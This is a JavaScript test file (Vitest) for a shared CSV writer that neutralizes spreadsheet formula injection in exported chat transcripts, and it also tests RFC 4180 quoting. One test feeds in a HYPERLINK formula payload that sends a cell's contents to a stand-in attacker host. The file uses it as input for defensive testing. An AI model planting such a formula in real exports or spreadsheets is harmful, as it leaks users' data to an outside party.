// The shared CSV writer (api/_lib/csv.js). Formula-injection neutralization is
// the reason this module exists: the widget transcript export previously
// serialized visitor-supplied chat content with a cell writer that only did
// RFC 4180 quoting, so a message beginning with "=" landed in the creator's
// spreadsheet as a live formula.
import { describe, it, expect } from 'vitest';
import { csvCell, csvCellJson, toCsv } from '../api/_lib/csv.js';

describe('csvCell — formula injection', () => {
	it('neutralizes every spreadsheet formula lead character', () => {
		expect(csvCell('=1+1')).toBe("'=1+1");
		expect(csvCell('+1')).toBe("'+1");
		expect(csvCell('-1')).toBe("'-1");
		expect(csvCell('@SUM(A1)')).toBe("'@SUM(A1)");
	});

	it('neutralizes leading tab and carriage return, which spreadsheets trim', () => {
		// A tab needs the quote prefix but not RFC 4180 quoting; a CR needs both.
		expect(csvCell('\t=1+1')).toBe("'\t=1+1");
		expect(csvCell('\r=1+1')).toBe('"\'\r=1+1"');
	});

	it('neutralizes the real-world HYPERLINK exfiltration payload', () => {
		const cell = csvCell('=HYPERLINK("https://evil.example?x="&A1,"click")');
		expect(cell.startsWith('"\'=') || cell.startsWith("'=")).toBe(true);
		expect(cell).not.toMatch(/^=/);
	});

	it('leaves an interior = alone', () => {
		expect(csvCell('a=b')).toBe('a=b');
	});
});

describe('csvCell — RFC 4180 quoting', () => {
	it('quotes and doubles embedded quotes', () => {
		expect(csvCell('say "hi"')).toBe('"say ""hi"""');
	});

	it('quotes cells containing commas and newlines', () => {
		expect(csvCell('a,b')).toBe('"a,b"');
		expect(csvCell('a\nb')).toBe('"a\nb"');
	});

	it('passes plain values through unquoted', () => {
		expect(csvCell('hello')).toBe('hello');
		expect(csvCell(42)).toBe('42');
	});

	it('renders null and undefined as empty', () => {
		expect(csvCell(null)).toBe('');
		expect(csvCell(undefined)).toBe('');
	});
});

describe('csvCellJson', () => {
	it('JSON-encodes objects and still quotes the result', () => {
		expect(csvCellJson({ a: 1 })).toBe('"{""a"":1}"');
	});

	it('leaves strings as strings', () => {
		expect(csvCellJson('plain')).toBe('plain');
	});

	it('still neutralizes formulas inside string input', () => {
		expect(csvCellJson('=1+1')).toBe("'=1+1");
	});
});

describe('toCsv', () => {
	it('builds a header and rows with a trailing newline', () => {
		const out = toCsv(['a', 'b'], [
			['1', '2'],
			['x,y', '=z'],
		]);
		expect(out).toBe('a,b\n1,2\n"x,y",\'=z\n');
	});
});
